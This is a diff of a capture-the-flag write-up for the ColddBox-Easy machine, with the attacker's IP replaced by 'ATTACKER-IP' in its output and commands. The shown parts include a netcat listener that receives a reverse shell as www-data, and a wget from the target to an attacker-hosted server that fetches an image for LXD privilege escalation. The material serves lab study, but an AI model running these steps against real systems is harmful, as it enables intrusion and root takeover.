@@ -125,7 +125,7 @@ I used Netcat to start a listener on port 9001 then visited the modified file in
 ```
 > nc -lvnp 9001
 listening on [any] 9001 ...
-connect to [192.168.133.166] from (UNKNOWN) [10.80.132.0] 33816
+connect to [ATTACKER-IP] from (UNKNOWN) [10.80.132.0] 33816
 /bin/sh: 0: can't access tty; job control turned off
 $ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
@@ -183,7 +183,7 @@ To perform this PrivEsc i need a image so i transfer one to the target machine f
 My machine:
 
 ```
-┌──(kali㉿kali)-[~/privesc/lxd-alpine-builder]
+┌──()-[~/privesc/lxd-alpine-builder]
 └─$ python3 -m http.server 8080              
 Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
 ```
@@ -192,7 +192,7 @@ Target machine:
 
 ``c0ldd@ColddBox-Easy:/var/www/html$ cd /tmp`
 
-`c0ldd@ColddBox-Easy:/tmp$ wget http://192.168.133.166:8080/alpine-v3.23-x86_64-20260328_1231.tar.gz`
+`c0ldd@ColddBox-Easy:/tmp$ wget http://ATTACKER-IP:8080/alpine-v3.23-x86_64-20260328_1231.tar.gz`
 
 First we import our image.
 ```
